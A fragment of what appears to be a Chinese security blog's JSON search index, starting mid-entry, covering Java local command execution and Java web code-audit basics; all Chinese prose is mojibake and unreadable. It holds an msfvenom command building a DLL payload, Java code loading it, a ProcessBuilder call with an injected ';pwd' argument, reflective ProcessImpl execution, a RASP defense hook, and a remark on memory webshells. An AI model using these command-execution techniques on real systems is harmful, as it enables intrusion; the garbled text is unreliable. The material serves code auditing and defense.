å®¡è®¡"],"title":"Java æœ¬åœ°å‘½ä»¤æ‰§è¡Œæ¼æ´","uri":"/2022/02/java%E6%9C%AC%E5%9C%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["ä»£ç å®¡è®¡"],"content":"load() åœ¨ Java Runtime åŒ…ä¸­ï¼Œè¿˜æœ‰å¦ä¸€ç§åŠ è½½å¤–éƒ¨åº“çš„å½¢å¼å»å‘½ä»¤æ‰§è¡Œã€‚é€šè¿‡åŠ è½½åŠ¨æ€é“¾æ¥åº“ï¼Œå¦‚ linux ä¸‹çš„ so æ–‡ä»¶ï¼Œwindows ä¸‹çš„ dll æ–‡ä»¶ã€‚ msfvenom -p windows/x64/exec --platform win -a x64 CMD=calc.exe EXITFUNC=thread -f dll\u003e calc.dll æµ‹è¯•ä»£ç ï¼š public class RCE { public static void main(String[] args) { Runtime rt = Runtime.getRuntime(); rt.load(\"D:\\\\calc.dll\"); } } ","date":"2022-02-13","objectID":"/2022/02/java%E6%9C%AC%E5%9C%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:3","tags":["ä»£ç å®¡è®¡"],"title":"Java æœ¬åœ°å‘½ä»¤æ‰§è¡Œæ¼æ´","uri":"/2022/02/java%E6%9C%AC%E5%9C%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["ä»£ç å®¡è®¡"],"content":"ProcessBuilder ä½¿ç”¨ ProcessBuilder ç±»åˆ›å»ºä¸€ä¸ªè¿›ç¨‹ï¼Œåˆ›å»º ProcessBuilder å®ä¾‹ï¼ŒæŒ‡å®šè¯¥è¿›ç¨‹çš„åç§°å’Œæ‰€éœ€å‚æ•° package com.geekby; import java.io.IOException; public class Main { public static void main(String[] args) throws IOException { String cmd = \";pwd\"; ProcessBuilder pb = new ProcessBuilder(\"ping\", \"127.0.0.1\", cmd); Process process = pb.start(); InputStream fis = process.getInputStream(); BufferedReader br = new BufferedReader(new InputStreamReader(fis)); String line = null; while ((line = br.readLine()) != null) { System.out.println(line); } } } è°ƒç”¨æ ˆï¼š create:-1, ProcessImpl (java.lang) \u003cinit\u003e:386, ProcessImpl (java.lang) start:137, ProcessImpl (java.lang) start:1029, ProcessBuilder (java.lang) main:8, Main (com.geekby) é€šè¿‡åˆ†æè°ƒç”¨æ ˆå¯ä»¥å‘ç°ï¼ŒProcessBuilder åœ¨åº•å±‚è°ƒç”¨çš„é€»è¾‘ä¸ Runtime.getRuntime.exec é€»è¾‘ç›¸ä¼¼ï¼Œåœ¨æ­¤ä¸åšèµ˜è¿°ã€‚ ","date":"2022-02-13","objectID":"/2022/02/java%E6%9C%AC%E5%9C%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":["ä»£ç å®¡è®¡"],"title":"Java æœ¬åœ°å‘½ä»¤æ‰§è¡Œæ¼æ´","uri":"/2022/02/java%E6%9C%AC%E5%9C%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["ä»£ç å®¡è®¡"],"content":"ProcessImpl ç”±äº ProcessImpl çš„æ„é€ å‡½æ•°æ˜¯ private å±æ€§çš„ï¼Œå› æ­¤ï¼Œéœ€è¦ç”¨åå°„çš„æ–¹å¼è°ƒç”¨å…¶é™æ€æ–¹æ³• startã€‚ package com.geekby; import java.io.IOException; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; import java.util.Map; public class Main { public static void main(String[] args) throws IOException, ClassNotFoundException, InvocationTargetException, IllegalAccessException, NoSuchMethodException { Class clazz = Class.forName(\"java.lang.ProcessImpl\"); Method start = clazz.getDeclaredMethod(\"start\", String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, boolean.class); start.setAccessible(true); start.invoke(null, (Object) new String[]{\"open\", \"-a\", \"Calculator\"}, null, null, null, false); } } è°ƒç”¨æ ˆï¼š create:-1, ProcessImpl (java.lang) \u003cinit\u003e:386, ProcessImpl (java.lang) start:137, ProcessImpl (java.lang) invoke0:-1, NativeMethodAccessorImpl (sun.reflect) invoke:62, NativeMethodAccessorImpl (sun.reflect) invoke:43, DelegatingMethodAccessorImpl (sun.reflect) invoke:498, Method (java.lang.reflect) main:14, main (com.geekby) ","date":"2022-02-13","objectID":"/2022/02/java%E6%9C%AC%E5%9C%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":["ä»£ç å®¡è®¡"],"title":"Java æœ¬åœ°å‘½ä»¤æ‰§è¡Œæ¼æ´","uri":"/2022/02/java%E6%9C%AC%E5%9C%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["ä»£ç å®¡è®¡"],"content":"é˜²å¾¡ æœ¬åœ°å‘½ä»¤æ‰§è¡Œæ˜¯ä¸€ç§éå¸¸é«˜é£é™©çš„æ¼æ´ï¼Œåœ¨ä»»ä½•æ—¶å€™éƒ½åº”å½“éå¸¸è°¨æ…çš„ä½¿ç”¨ï¼Œåœ¨ä¸šåŠ¡ä¸­å¦‚æœä½¿ç”¨åˆ°äº†æœ¬åœ°ç³»ç»Ÿå‘½ä»¤é‚£ä¹ˆåº”å½“ç¦æ­¢æ¥æ”¶ç”¨æˆ·ä¼ å…¥å‚æ•°ã€‚åœ¨å¾ˆå¤šæ—¶å€™æ”»å‡»è€…ä¼šåˆ©ç”¨æŸäº›æ¼æ´ï¼ˆå¦‚ï¼šStruts2ã€ååºåˆ—åŒ–ç­‰ï¼‰æ¥æ”»å‡»æˆ‘ä»¬çš„ä¸šåŠ¡ç³»ç»Ÿï¼Œæœ€ç»ˆåˆ©ç”¨ Java æœ¬åœ°å‘½ä»¤æ‰§è¡Œè¾¾åˆ°æ§åˆ¶ Web æœåŠ¡å™¨çš„ç›®çš„ã€‚è¿™ç§æƒ…å†µä¸‹ç”¨æˆ·æ‰§è¡Œçš„ç³»ç»Ÿå‘½ä»¤å¯¹æˆ‘ä»¬æ¥è¯´å°±ä¸å†å—æ§åˆ¶äº†ï¼Œæˆ‘ä»¬é™¤äº†å¯ä»¥é…ç½®SecurityManagerè§„åˆ™é™åˆ¶å‘½ä»¤æ‰§è¡Œä»¥å¤–ï¼Œè¿˜å¯ä»¥ä½¿ç”¨ RASP æ¥é˜²å¾¡æœ¬åœ°å‘½ä»¤æ‰§è¡Œå°±æ˜¾å¾—æ›´åŠ çš„ä¾¿æ·å¯é ã€‚ ","date":"2022-02-13","objectID":"/2022/02/java%E6%9C%AC%E5%9C%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:5:0","tags":["ä»£ç å®¡è®¡"],"title":"Java æœ¬åœ°å‘½ä»¤æ‰§è¡Œæ¼æ´","uri":"/2022/02/java%E6%9C%AC%E5%9C%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["ä»£ç å®¡è®¡"],"content":"RASP é˜²å¾¡ Java æœ¬åœ°å‘½ä»¤æ‰§è¡Œ åœ¨ Java åº•å±‚æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„ API æ˜¯ java.lang.UNIXProcess/ProcessImpl#forkAndExec æ–¹æ³•ï¼ŒforkAndExec æ˜¯ä¸€ä¸ª native æ–¹æ³•ï¼Œå¦‚æœæƒ³è¦ Hook è¯¥æ–¹æ³•éœ€è¦ä½¿ç”¨ Agent æœºåˆ¶ä¸­çš„ Can-Set-Native-Method-Prefixï¼Œä¸º forkAndExec è®¾ç½®ä¸€ä¸ªåˆ«åï¼Œå¦‚ï¼š__RASP__forkAndExecï¼Œç„¶åé‡å†™__RASP__forkAndExec æ–¹æ³•é€»è¾‘ï¼Œå³å¯å®ç°å¯¹åŸ forkAndExec æ–¹æ³• Hookã€‚ /** * Hook Windowsç³»ç»Ÿ ProcessImpl ç±»æ„é€ æ–¹æ³• */ @RASPMethodHook( className = \"java.lang.ProcessImpl\", methodName = CONSTRUCTOR_INIT, methodArgsDesc = \".*\", methodDescRegexp = true ) public static class ProcessImplHook extends RASPMethodAdvice { @Override public RASPHookResult\u003c?\u003e onMethodEnter() { try { String[] commands = null; // JDK9+çš„APIå‚æ•°ä¸ä¸€æ ·ï¼ if (getArg(0) instanceof String[]) { commands = getArg(0); } else if (getArg(0) instanceof byte[]) { commands = new String[]{new String((byte[]) getArg(0))}; } // æ£€æµ‹æ‰§è¡Œçš„å‘½ä»¤åˆæ³•æ€§ return LocalCommandHookHandler.processCommand(commands, getThisObject(), this); } catch (Exception e) { RASPLogger.log(AGENT_NAME + \"å¤„ç†ProcessImplå¼‚å¸¸:\" + e, e); } return new RASPHookResult\u003c?\u003e(RETURN); } } ","date":"2022-02-13","objectID":"/2022/02/java%E6%9C%AC%E5%9C%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:5:1","tags":["ä»£ç å®¡è®¡"],"title":"Java æœ¬åœ°å‘½ä»¤æ‰§è¡Œæ¼æ´","uri":"/2022/02/java%E6%9C%AC%E5%9C%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["ä»£ç å®¡è®¡"],"content":"Java ä»£ç å®¡è®¡èƒŒæ™¯","date":"2022-02-13","objectID":"/2022/02/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%83%8C%E6%99%AF/","tags":["ä»£ç å®¡è®¡"],"title":"Java ä»£ç å®¡è®¡ - èƒŒæ™¯","uri":"/2022/02/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%83%8C%E6%99%AF/"},{"categories":["ä»£ç å®¡è®¡"],"content":"Java ä»£ç å®¡è®¡èƒŒæ™¯ ","date":"2022-02-13","objectID":"/2022/02/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%83%8C%E6%99%AF/:0:0","tags":["ä»£ç å®¡è®¡"],"title":"Java ä»£ç å®¡è®¡ - èƒŒæ™¯","uri":"/2022/02/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%83%8C%E6%99%AF/"},{"categories":["ä»£ç å®¡è®¡"],"content":"1 Java Web åŸºç¡€ ","date":"2022-02-13","objectID":"/2022/02/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%83%8C%E6%99%AF/:1:0","tags":["ä»£ç å®¡è®¡"],"title":"Java ä»£ç å®¡è®¡ - èƒŒæ™¯","uri":"/2022/02/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%83%8C%E6%99%AF/"},{"categories":["ä»£ç å®¡è®¡"],"content":"1.1 Servlet 1.1.1 æ¦‚å¿µ Java Servlet æ˜¯è¿è¡Œåœ¨ Web æœåŠ¡å™¨æˆ–åº”ç”¨æœåŠ¡å™¨ä¸Šçš„ç¨‹åºï¼Œå®ƒæ˜¯ä½œä¸ºæ¥è‡ª Web æµè§ˆå™¨æˆ–å…¶ä»– HTTP å®¢æˆ·ç«¯çš„è¯·æ±‚å’Œ HTTP æœåŠ¡å™¨ä¸Šçš„æ•°æ®åº“æˆ–åº”ç”¨ç¨‹åºä¹‹é—´çš„ä¸­é—´å±‚ã€‚ ä½¿ç”¨ Servletï¼Œæ‚¨å¯ä»¥æ”¶é›†æ¥è‡ªç½‘é¡µè¡¨å•çš„ç”¨æˆ·è¾“å…¥ï¼Œå‘ˆç°æ¥è‡ªæ•°æ®åº“æˆ–è€…å…¶ä»–æºçš„è®°å½•ï¼Œè¿˜å¯ä»¥åŠ¨æ€åˆ›å»ºç½‘é¡µã€‚ Java Servlet é€šå¸¸æƒ…å†µä¸‹ä¸ä½¿ç”¨ CGI (Common Gateway Interfaceï¼Œå…¬å…±ç½‘å…³æ¥å£)å®ç°çš„ç¨‹åºå¯ä»¥è¾¾åˆ°å¼‚æ›²åŒå·¥çš„æ•ˆæœã€‚ä½†æ˜¯ç›¸æ¯”äº CGlï¼ŒServlet æœ‰ä»¥ä¸‹å‡ ç‚¹ä¼˜åŠ¿: æ€§èƒ½æ˜æ˜¾æ›´å¥½ Servlet åœ¨ web æœåŠ¡å™¨çš„åœ°å€ç©ºé—´å†…æ‰§è¡Œè¿™æ ·å®ƒå°±æ²¡æœ‰å¿…è¦å†åˆ›å»ºä¸€ä¸ªå•ç‹¬çš„è¿›ç¨‹æ¥å¤„ç†æ¯ä¸ªå®¢æˆ·ç«¯è¯·æ±‚ Servlet æ˜¯ç‹¬ç«‹äºå¹³å°çš„ï¼Œå› ä¸ºå®ƒä»¬æ˜¯ç”¨ Java ç¼–å†™çš„ æœåŠ¡å™¨ä¸Šçš„ Java å®‰å…¨ç®¡ç†å™¨æ‰§è¡Œäº†ä¸€ç³»åˆ—é™åˆ¶ä»¥ä¿æŠ¤æœåŠ¡å™¨è®¡ç®—æœºä¸Šçš„èµ„æºã€‚å› æ­¤ï¼ŒServlet æ˜¯å¯ä¿¡çš„ã€‚ Java ç±»åº“çš„å…¨éƒ¨åŠŸèƒ½å¯¹ Servlet æ¥è¯´éƒ½æ˜¯å¯ç”¨çš„ã€‚å®ƒå¯ä»¥é€šè¿‡ sockets å’Œ RMI æœºåˆ¶ä¸ appletsã€æ•°æ®åº“æˆ–å…¶ä»–è½¯ä»¶è¿›è¡Œäº¤äº’ã€‚ 1.1.2 Servlet æ¶æ„ 1.1.3 Servlet ç”Ÿå‘½å‘¨æœŸ Servlet ç”Ÿå‘½å‘¨æœŸå¯è¢«å®šä¹‰ä¸ºä»åˆ›å»ºç›´åˆ°æ¯ç­çš„æ•´ä¸ªè¿‡ç¨‹ã€‚ ä»¥ä¸‹æ˜¯ Servlet éµå¾ªçš„è¿‡ç¨‹ï¼š Servlet åˆå§‹åŒ–åè°ƒç”¨ init() æ–¹æ³•ã€‚ Servlet è°ƒç”¨ service() æ–¹æ³•æ¥å¤„ç†å®¢æˆ·ç«¯çš„è¯·æ±‚ã€‚(è°ƒç”¨ doGetã€ doPostç­‰æ–¹æ³•) Servlet é”€æ¯å‰è°ƒç”¨ destroy() æ–¹æ³• æœ€åï¼ŒServlet æ˜¯ç”± JVM çš„åƒåœ¾å›æ”¶å™¨è¿›è¡Œåƒåœ¾å›æ”¶çš„ ","date":"2022-02-13","objectID":"/2022/02/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%83%8C%E6%99%AF/:1:1","tags":["ä»£ç å®¡è®¡"],"title":"Java ä»£ç å®¡è®¡ - èƒŒæ™¯","uri":"/2022/02/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%83%8C%E6%99%AF/"},{"categories":["ä»£ç å®¡è®¡"],"content":"1.2 JSP 1.2.1 æ¦‚å¿µ JSP å…¨ç§° Java Server Pagesï¼Œæ˜¯ä¸€ç§åŠ¨æ€ç½‘é¡µå¼€å‘æŠ€æœ¯ã€‚å®ƒä½¿ç”¨ JSP æ ‡ç­¾åœ¨ HTML ç½‘é¡µä¸­æ’å…¥ Java ä»£ç ã€‚æ ‡ç­¾é€šå¸¸ä»¥ \u003c% å¼€å¤´ï¼Œä»¥ %\u003e ç»“æŸã€‚ JSP æ˜¯ä¸€ç§ Java servletï¼Œä¸»è¦ç”¨äºå®ç° Java web åº”ç”¨ç¨‹åºçš„ç”¨æˆ·ç•Œé¢éƒ¨åˆ†ã€‚ç½‘é¡µå¼€å‘è€…ä»¬é€šè¿‡ç»“åˆ HTML ä»£ç ã€ XHTML ä»£ç ã€XML å…ƒç´ ä»¥åŠåµŒå…¥ JSP æ“ä½œå’Œå‘½ä»¤æ¥ç¼–å†™ JSP JSP é€šè¿‡ç½‘é¡µè¡¨å•è·å–ç”¨æˆ·è¾“å…¥æ•°æ®ã€è®¿é—®æ•°æ®åº“åŠå…¶ä»–æ•°æ®æºï¼Œç„¶ååŠ¨æ€åœ°åˆ›å»ºç½‘é¡µã€‚ JSP æ ‡ç­¾æœ‰å¤šç§åŠŸèƒ½ï¼Œæ¯”å¦‚è®¿é—®æ•°æ®åº“ã€è®°å½•ç”¨æˆ·é€‰æ‹©ä¿¡æ¯ã€è®¿é—® JavaBeans ç»„ä»¶ç­‰,è¿˜å¯ä»¥åœ¨ä¸åŒçš„ç½‘é¡µä¸­ä¼ é€’æ§åˆ¶ä¿¡æ¯å’Œå…±äº«ä¿¡æ¯ã€‚ 1.2.2 JSP å¤„ç†è¿‡ç¨‹ å°±åƒå…¶ä»–æ™®é€šçš„ç½‘é¡µä¸€æ ·ï¼Œæµè§ˆå™¨å‘é€ä¸€ä¸ª HTTP è¯·æ±‚ç»™æœåŠ¡å™¨ã€‚ Web æœåŠ¡å™¨è¯†åˆ«å‡ºè¿™æ˜¯ä¸€ä¸ªå¯¹ JSP ç½‘é¡µçš„è¯·æ±‚ï¼Œå¹¶ä¸”å°†è¯¥è¯·æ±‚ä¼ é€’ç»™ JSP å¼•æ“ã€‚é€šè¿‡ä½¿ç”¨ URL æˆ–è€… .jsp æ–‡ä»¶æ¥å®Œæˆ JSP å¼•æ“ä»ç£ç›˜ä¸­è½½å…¥ JSP æ–‡ä»¶ï¼Œç„¶åå°†å®ƒä»¬è½¬åŒ–ä¸º Servletã€‚è¿™ç§è½¬åŒ–åªæ˜¯ç®€å•åœ°å°†æ‰€æœ‰æ¨¡æ¿æ–‡æœ¬æ”¹ç”¨ println() è¯­å¥ï¼Œå¹¶ä¸”å°†æ‰€æœ‰çš„ JSP å…ƒç´ è½¬åŒ–æˆ Java ä»£ç  JSP å¼•æ“å°† Servlet ç¼–è¯‘æˆå¯æ‰§è¡Œç±»ï¼Œå¹¶ä¸”å°†åŸå§‹è¯·æ±‚ä¼ é€’ç»™ Servlet å¼•æ“ Web æœåŠ¡å™¨çš„æŸç»„ä»¶å°†ä¼šè°ƒç”¨ Servlet å¼•æ“ï¼Œç„¶åè½½å…¥å¹¶æ‰§è¡Œ Servlet ç±»ã€‚åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼ŒServlet äº§ç”Ÿ HTML æ ¼å¼çš„è¾“å‡ºå¹¶å°†å…¶å†…åµŒäº HTTP response web ä¸­ä¸Šäº¤ç»™ Web æœåŠ¡å™¨ã€‚ Web æœåŠ¡å™¨ä»¥é™æ€ HTML ç½‘é¡µçš„å½¢å¼å°† web response è¿”å›åˆ°æµè§ˆå™¨ä¸­ æœ€ç»ˆï¼ŒWeb æµè§ˆå™¨å¤„ç† web response ä¸­åŠ¨æ€äº§ç”Ÿçš„ HTML ç½‘é¡µï¼Œå°±å¥½åƒåœ¨å¤„ç†é™æ€ç½‘é¡µä¸€æ ·ã€‚ 1.2.3 JSP çš„ç”Ÿå‘½å‘¨æœŸ ç¼–è¯‘é˜¶æ®µï¼šServlet å®¹å™¨ç¼–è¯‘æºæ–‡ä»¶ï¼Œç”Ÿæˆ Servlet ç±» JSP å¼•æ“ä¼šæ£€æŸ¥æ˜¯å¦éœ€è¦ç¼–è¯‘ åˆå§‹åŒ–é˜¶æ®µï¼šåŠ è½½ä¸ JSP å¯¹åº” Servlet çš„ç±»ï¼Œåˆ›å»ºå…¶å®ä¾‹ï¼Œå¹¶è°ƒç”¨å®ƒçš„åˆå§‹åŒ–æ–¹æ³• jsplnit() æ‰§è¡Œé˜¶æ®µï¼šè°ƒç”¨ä¸ JSP å¯¹åº” Servlet çš„å®ä¾‹çš„æœåŠ¡æ–¹æ³• jspService() é”€æ¯é˜¶æ®µï¼šè°ƒç”¨ä¸ JSP å¯¹åº” Servlet çš„å®ä¾‹çš„é”€æ¯æ–¹æ³•ï¼Œç„¶åé”€æ¯ Servlet å®ä¾‹ jspDestroy() ","date":"2022-02-13","objectID":"/2022/02/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%83%8C%E6%99%AF/:1:2","tags":["ä»£ç å®¡è®¡"],"title":"Java ä»£ç å®¡è®¡ - èƒŒæ™¯","uri":"/2022/02/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%83%8C%E6%99%AF/"},{"categories":["ä»£ç å®¡è®¡"],"content":"1.3 Filter 1.3.1 æ¦‚å¿µ Servlet è¿‡æ»¤å™¨å¯ä»¥åŠ¨æ€åœ°æ‹¦æˆªè¯·æ±‚å’Œå“åº”ï¼Œä»¥å˜æ¢æˆ–ä½¿ç”¨åŒ…å«åœ¨è¯·æ±‚æˆ–å“åº”ä¸­çš„ä¿¡æ¯ã€‚ å¯ä»¥å°†ä¸€ä¸ªæˆ–å¤šä¸ª Servlet è¿‡æ»¤å™¨é™„åŠ åˆ°ä¸€ä¸ª Servlet æˆ–ä¸€ç»„ Servletã€‚Servlet è¿‡æ»¤å™¨ä¹Ÿå¯ä»¥é™„åŠ åˆ° JavaServer Pages(JSP) æ–‡ä»¶å’Œ HTML é¡µé¢ã€‚è°ƒç”¨ Servlet å‰è°ƒç”¨æ‰€æœ‰é™„åŠ çš„è¿‡æ»¤å™¨ã€‚ Servlet è¿‡æ»¤å™¨æ˜¯å¯ç”¨äºç¼–ç¨‹çš„ Java ç±»ï¼Œå¯ä»¥å®ç°ä»¥ä¸‹ç›®çš„ï¼š åœ¨å®¢æˆ·ç«¯çš„è¯·æ±‚è®¿é—®åç«¯èµ„æºä¹‹å‰ï¼Œæ‹¦æˆªè¿™äº›è¯·æ±‚ã€‚ åœ¨æœåŠ¡å™¨çš„å“åº”å‘é€å›å®¢æˆ·ç«¯ä¹‹å‰ï¼Œå¤„ç†è¿™äº›å“åº”ã€‚ 1.3.2 Filter æ–¹æ³• public void doFilter(ServletRequest, ServletRespor, FilterChain) è¯¥æ–¹æ³•å®Œæˆå®é™…çš„è¿‡æ»¤æ“ä½œï¼Œå½“å®¢æˆ·ç«¯è¯·æ±‚æ–¹æ³•ä¸è¿‡æ»¤å™¨è®¾ç½®åŒ¹é…çš„ URL æ—¶ï¼ŒServlet å®¹å™¨å°†å…ˆè°ƒç”¨è¿‡æ»¤å™¨çš„ doFilter æ–¹æ³•ã€‚FilterChain ç”¨æˆ·è®¿é—®åç»­è¿‡æ»¤å™¨ã€‚ public void init(FilterConfig filterConfig) web åº”ç”¨ç¨‹åºå¯åŠ¨æ—¶ï¼Œweb æœåŠ¡å™¨å°†åˆ›å»º Filter çš„å®ä¾‹å¯¹è±¡ï¼Œå¹¶è°ƒç”¨å…¶ init æ–¹æ³•ï¼Œè¯»å– web.xml é…ç½®ï¼Œå®Œæˆå¯¹è±¡çš„åˆå§‹åŒ–åŠŸèƒ½ï¼Œä»è€Œä¸ºåç»­çš„ç”¨æˆ·è¯·æ±‚ä½œå¥½æ‹¦æˆªçš„å‡†å¤‡å·¥ä½œ(filter å¯¹è±¡åªä¼šåˆ›å»ºä¸€æ¬¡ï¼Œinit æ–¹æ³•ä¹Ÿåªä¼šæ‰§è¡Œä¸€æ¬¡)ã€‚å¼€å‘äººå‘˜é€šè¿‡ init æ–¹æ³•çš„å‚æ•°ï¼Œå¯è·å¾—ä»£è¡¨å½“å‰ filter é…ç½®ä¿¡æ¯çš„å¯¹è±¡ã€‚ public void destroy() Servlet å®¹å™¨åœ¨é”€æ¯è¿‡æ»¤å™¨å®ä¾‹å‰è°ƒç”¨è¯¥æ–¹æ³•ï¼Œåœ¨è¯¥æ–¹æ³•ä¸­é‡Šæ”¾ Servlet è¿‡æ»¤å™¨å ç”¨çš„èµ„æºã€‚ ","date":"2022-02-13","objectID":"/2022/02/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%83%8C%E6%99%AF/:1:3","tags":["ä»£ç å®¡è®¡"],"title":"Java ä»£ç å®¡è®¡ - èƒŒæ™¯","uri":"/2022/02/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%83%8C%E6%99%AF/"},{"categories":["ä»£ç å®¡è®¡"],"content":"1.4 Listener ç›‘å¬å™¨ç”¨äºç›‘å¬ web åº”ç”¨ä¸­æŸäº›å¯¹è±¡ã€ä¿¡æ¯çš„åˆ›å»ºã€é”€æ¯ã€å¢åŠ ï¼Œä¿®æ”¹ï¼Œåˆ é™¤ç­‰åŠ¨ä½œçš„å‘ç”Ÿï¼Œç„¶åä½œå‡ºç›¸åº”çš„å“åº”å¤„ç†ã€‚å½“èŒƒå›´å¯¹è±¡çš„çŠ¶æ€å‘ç”Ÿå˜åŒ–çš„æ—¶å€™ï¼ŒæœåŠ¡å™¨è‡ªåŠ¨è°ƒç”¨ç›‘å¬å™¨å¯¹è±¡ä¸­çš„æ–¹æ³•ã€‚ æŒ‰ç›‘å¬çš„å¯¹è±¡åˆ’åˆ†ï¼Œå¯ä»¥åˆ†ä¸ºï¼š ServletContext å¯¹è±¡ç›‘å¬å™¨ HttpSession å¯¹è±¡ç›‘å¬å™¨ ServletRequest å¯¹è±¡ç›‘å¬å™¨ å…¶ä¸­å‰ä¸¤ç§éƒ½ä¸é€‚åˆä½œä¸ºå†…å­˜ Webshellï¼Œå› ä¸ºæ¶‰åŠåˆ°æœåŠ¡å™¨çš„å¯åŠ¨è·Ÿåœæ­¢ï¼Œæˆ–è€…æ˜¯ Session çš„å»ºç«‹è·Ÿé”€æ¯ï¼Œç›®å…‰å°±èšé›†åˆ°ç¬¬ä¸‰ç§å¯¹äºè¯·æ±‚çš„ç›‘å¬ä¸Šé¢ï¼Œå…¶ä¸­æœ€é€‚åˆä½œä¸º Webshell çš„è¦æ•° ServletRequestListenerï¼Œå› ä¸ºæˆ‘ä»¬å¯ä»¥æ‹¿åˆ°æ¯æ¬¡è¯·æ±‚çš„çš„äº‹ä»¶ï¼šServletRequestEventï¼Œé€šè¿‡å…¶ä¸­çš„ getServletRequest() å‡½æ•°å°±å¯ä»¥æ‹¿åˆ°æœ¬æ¬¡è¯·æ±‚çš„ request å¯¹è±¡ï¼Œä»è€ŒåŠ å…¥æˆ‘ä»¬çš„æ¶æ„é€»è¾‘ ã€‚ ","date":"2022-02-13","objectID":"/2022/02/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%83%8C%E6%99%AF/:1:4","tags":["ä»£ç å®¡è®¡"],"title":"Java ä»£ç å®¡è®¡ - èƒŒæ™¯","uri":"/2022/02/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%83%8C%E6%99%AF/"},{"categories":["ä»£ç å®¡è®¡"],"content":"2 SSH æ¡†æ¶ ","date":"2022-02-13","objectID":"/2022/02/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%83%8C%E6%99%AF/:2:0","tags":["ä»£ç å®¡è®¡"],"title":"Java ä»£ç å®¡è®¡ - èƒŒæ™¯","uri":"/2022/02/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E8%83%8C%E6%99%AF/"},{"categories":["ä»£ç å®¡è®¡"],"content":"2.1 MVC MVC æ¨¡å¼æ˜¯è½¯ä»¶å·¥ç¨‹ä¸­çš„ä¸€ç§è½¯ä»¶æ¶æ„æ¨¡å¼ï¼ŒæŠŠè½¯ä»¶ç³»ç»Ÿåˆ†ä¸ºä¸‰ä¸ªåŸºæœ¬éƒ¨åˆ†ï¼šæ¨¡å‹ï¼ˆModelï¼‰ã€è§†å›¾ï¼ˆViewï¼‰å’Œæ§åˆ¶å™¨ï¼ˆControllerï¼‰ã€‚ MVC æ¨¡å¼çš„ç›®çš„æ˜¯å®ç°ä¸€ç§åŠ¨æ€çš„ç¨‹åºè®¾è®¡ï¼Œä½¿åç»­å¯¹ç¨‹åºçš„ä¿®æ”¹å’Œæ‰©å±•ç®€åŒ–ï¼Œå¹¶ä¸”ä½¿ç¨‹åºæŸä¸€éƒ¨åˆ†çš„é‡å¤åˆ©ç”¨æˆä¸ºå¯èƒ½ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œæ­¤æ¨¡å¼é€è¿‡å¯¹å¤æ‚åº¦çš„ç®€åŒ–ï¼Œä½¿ç¨‹åºç»“æ„æ›´åŠ ç›´è§‚ã€‚è½¯ä»¶ç³»ç»Ÿé€è¿‡å¯¹è‡ªèº«åŸºæœ¬éƒ¨åˆ†åˆ†ç¦»çš„åŒæ—¶ä¹Ÿèµ‹äºˆäº†å„ä¸ªåŸºæœ¬éƒ¨åˆ†åº”æœ‰çš„åŠŸèƒ½ã€‚ æ¨¡å‹ï¼ˆModelï¼‰- ç¨‹åºå‘˜ç¼–å†™ç¨‹åºåº”æœ‰çš„åŠŸèƒ½ï¼ˆå®ç°ç®—æ³•ç­‰ç­‰ï¼‰ã€æ•°æ®åº“ä¸“å®¶è¿›è¡Œæ•°æ®ç®¡ç†å’Œæ•°æ®åº“è®¾è®¡ï¼ˆå¯ä»¥å®ç°å…·ä½“çš„åŠŸèƒ½ï¼‰ã€‚ è§†å›¾ï¼ˆViewï¼‰- ç•Œé¢è®¾è®¡äººå‘˜è¿›è¡Œå›¾å½¢ç•Œé¢è®¾è®¡ã€‚ æ§åˆ¶å™¨ï¼ˆControllerï¼‰- è´Ÿè´£è½¬å‘è¯·æ±‚ï¼Œå¯¹è¯·æ±‚è¿›è¡Œå¤„ç†æ€§èƒ½æ˜æ˜¾æ›´å¥½ã€‚ 2.1.1 MVC æ—©æœŸæ¶æ„ 2.1.2 MVC ç°ä»£æ¶æ„ 